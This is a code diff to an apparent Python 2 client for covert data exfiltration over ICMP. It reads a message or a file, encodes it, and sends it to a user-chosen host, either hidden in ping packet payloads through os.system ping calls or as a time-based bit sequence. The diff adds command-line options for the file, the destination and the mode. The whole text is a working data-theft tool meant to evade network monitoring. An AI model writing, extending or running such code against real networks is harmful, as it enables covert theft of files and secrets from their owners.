@@ -1,5 +1,6 @@
 import os, sys, base64
 from time import sleep
+import argparse
 
 # different methods of exfiltration:
 # - time-based (server and client pre-establish time diff, maybe pattern)
@@ -18,7 +19,13 @@ def dataFile(filename):
     return content
 
 # - data-based (remaining bytes - more noisy)
-def exfiltrateLastBytes(data, ip):
+def exfiltrateLastBytes(data, ip, src):
+
+    print "[*] Destination of data: {}".format(ip)
+    if src:
+        print "[*] Sending encoded file: {}".format(src)
+    else:
+        print "[*] Sending encoded message: \"{}\"".format(data)
 
     # add final signal to stop receiving data
     string = base64.b64encode(data).encode("hex") + "0a"
@@ -35,12 +42,18 @@ def exfiltrateLastBytes(data, ip):
     for i in blocks:
         os.system("ping -c1 -p {} {} > /dev/null".format(i, ip))
 
+    print "[*] Message sent to {}".format(ip)
+
 # - time-based (send in time sequence)
-def exfiltrateTimeBased(data, ip):
+def exfiltrateTimeBased(data, ip, src):
 
     seq = bin(int((data).encode("hex"), 16))
 
-    print "[*] Sending encoded message: \"{}\"".format(data)
+    print "[*] Destination of data: {}".format(ip)
+    if src:
+        print "[*] Sending encoded file: {}".format(src)
+    else:
+        print "[*] Sending encoded message: \"{}\"".format(data)
 
     for i in seq[2:]:
         sleep(.1)
@@ -54,15 +67,26 @@ def exfiltrateTimeBased(data, ip):
 
 if __name__ == "__main__":
 
-    data = sys.argv[1]
-    ip = "127.0.0.1"
+    parser = argparse.ArgumentParser(description='Client that sends data disguised in ICMP packets. Keep in mind settings need to be the same for the server')
+    parser.add_argument('-i', '--input', type=str, help='data to be sent')
+    parser.add_argument('-f', '--file', type=str, help='the file where the sum should be written')
+    parser.add_argument('-d', '--dest', type=str, help='the destination of the packets (ex: 127.0.0.1)')
+    parser.add_argument('-m', '--mode', type=int, default=1, help='the mode of exfiltration: 1 is lousy (inside packets), 2 time-based')
+    args = parser.parse_args()
 
-    # add argparse support for file exfiltration or simple info
 
-    if data:
+    # add support for exclusive between input and file
+    # add support for Necessary argument between input or file
+    # add support for necessary ip
 
-        # if file flag is set:
-        #   data = dataFile(data)
+    data = args.input
 
-        # exfiltrateLastBytes(data, ip)
-        exfiltrateTimeBased(data, ip)
+    if args.file:
+        data = dataFile(args.file)
+
+    ip = args.dest
+
+    if args.mode == 1:
+        exfiltrateLastBytes(data, ip, args.file)
+    elif args.mode == 2:
+        exfiltrateTimeBased(data, ip, args.file)
